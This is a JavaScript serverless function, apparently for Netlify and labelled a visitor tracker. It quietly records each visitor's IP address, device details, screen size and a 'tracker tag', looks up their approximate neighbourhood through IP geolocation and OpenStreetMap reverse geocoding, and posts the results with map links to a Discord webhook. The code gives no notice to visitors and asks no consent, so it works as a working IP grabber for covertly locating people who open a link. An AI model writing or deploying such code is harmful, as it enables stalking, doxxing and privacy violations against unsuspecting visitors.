exports.handler = async (event, context) => {
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    try {
        const rawIp = event.headers['x-nf-client-connection-ip'] || 
                      event.headers['x-forwarded-for']?.split(',')[0]?.trim() || '';
        
        const { screenRes, refUrl, userAgent } = JSON.parse(event.body || '{}');
        let ipData = { ip: rawIp, city: "Unknown", area: "", region: "Unknown", org: "Unknown", lat: null, lon: null };

        let targetIp = rawIp;
        if (!targetIp || targetIp === '::1' || targetIp === '127.0.0.1') {
            try {
                const v6Res = await fetch('https://api64.ipify.org?format=json');
                if (v6Res.ok) {
                    const v6Data = await v6Res.json();
                    targetIp = v6Data.ip;
                }
            } catch (e) {}
        }

        // 1. Fetch IP coordinates from ipwho.is
        try {
            const geoRes = await fetch(`https://ipwho.is/${targetIp}`);
            if (geoRes.ok) {
                const d = await geoRes.json();
                if (d.success) {
                    ipData = { 
                        ip: d.ip, 
                        city: d.city || "Unknown", 
                        region: d.region || "Unknown", 
                        org: d.connection?.isp || d.connection?.org || "Unknown", 
                        lat: d.latitude || null, 
                        lon: d.longitude || null 
                    };
                }
            }
        } catch (e) {}

        // 2. Reverse geocode lat/lon to get precise neighborhood area via OpenStreetMap
        if (ipData.lat && ipData.lon) {
            try {
                const osmRes = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${ipData.lat}&lon=${ipData.lon}&format=json`, {
                    headers: { 'User-Agent': 'VisitorTracker/1.0' }
                });
                if (osmRes.ok) {
                    const osmData = await osmRes.json();
                    const addr = osmData.address || {};
                    // Extract precise area/suburb name
                    ipData.area = addr.suburb || addr.neighbourhood || addr.residential || addr.subdistrict || addr.quarter || "";
                }
            } catch (e) {
                console.log("OSM Reverse Geocode Error:", e.message);
            }
        }

        // Format Area / City output cleanly
        let locationText = ipData.area 
            ? `${ipData.area}, ${ipData.city}` 
            : `${ipData.city}, ${ipData.region}`;
        
        let mapsUrl = "N/A";
        let mapImageUrl = "";

        if (ipData.lat && ipData.lon) {
            mapsUrl = `https://www.google.com/maps?q=${ipData.lat},${ipData.lon}`;
            mapImageUrl = `https://static-maps.yandex.ru/1.x/?l=map&pt=${ipData.lon},${ipData.lat},pm2rdm&z=13&size=450,250&lang=en_US`;
        }

        let deviceType = "Desktop / PC";
        if (/iPhone/i.test(userAgent)) deviceType = "📱 iPhone";
        else if (/iPad/i.test(userAgent)) deviceType = "📱 iPad";
        else if (/Android/i.test(userAgent)) deviceType = "📱 Android Mobile";

        const payload = {
            embeds: [{
                title: "New Visitor!",
                color: 0x1DB954,
                description: mapsUrl !== "N/A" ? `[Open Coordinates in Maps](${mapsUrl})` : "Location unavailable",
                fields: [
                    { name: "IP Address", value: ipData.ip || "Unknown", inline: true },
                    { name: "Area / City", value: locationText, inline: true },
                    { name: "ISP/Network", value: ipData.org || "Unknown", inline: false },
                    { name: "Device Type", value: deviceType, inline: true },
                    { name: "Screen Size", value: screenRes || "Unknown", inline: true },
                    { name: "Ref / Tracker Tag", value: refUrl || "Direct / None", inline: true },
                    { name: "User Agent Details", value: `\`\`\`${(userAgent || '').slice(0, 250)}\`\`\``, inline: false }
                ],
                image: mapImageUrl ? { url: mapImageUrl } : undefined,
                timestamp: new Date().toISOString()
            }]
        };

        await fetch(process.env.DISCORD_WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        return { statusCode: 200, body: JSON.stringify({ success: true }) };
    } catch (e) {
        return { statusCode: 500, body: JSON.stringify({ error: e.message }) };
    }
};